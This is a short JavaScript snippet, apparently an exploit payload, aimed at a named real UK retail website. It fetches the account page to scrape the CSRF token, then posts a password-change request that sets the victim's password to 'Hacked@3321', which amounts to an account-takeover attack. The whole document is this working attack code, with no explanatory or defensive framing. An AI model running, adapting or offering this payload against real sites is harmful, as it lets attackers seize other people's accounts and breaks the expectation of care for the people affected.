let csrfToken;

// Fetch the csrf token value
fetch('https://www.petit-bateau.co.uk/my-account/personal-details/')
  .then(response => response.text())
  .then(data => {
    csrfToken = data.match(/<input type="hidden" name="csrf_token" value="([^"]+)" \/>/)[1];
    console.log(csrfToken);

    // Send a POST request with the data
    const formData = new FormData();
    formData.append('dwfrm_profile_login_accountpassword_d0jjzghsnbza', 'Hacked@3321');
    formData.append('csrf_token', csrfToken);

    fetch('https://www.petit-bateau.co.uk/on/demandware.store/Sites-PB_UK-Site/en_GB/Account-UpdatePassword', {
      method: 'POST',
      body: formData
    })
    .then(response => {
      console.log(response.text());
    })
    .catch(error => console.error(error));
  })
  .catch(error => console.error(error));
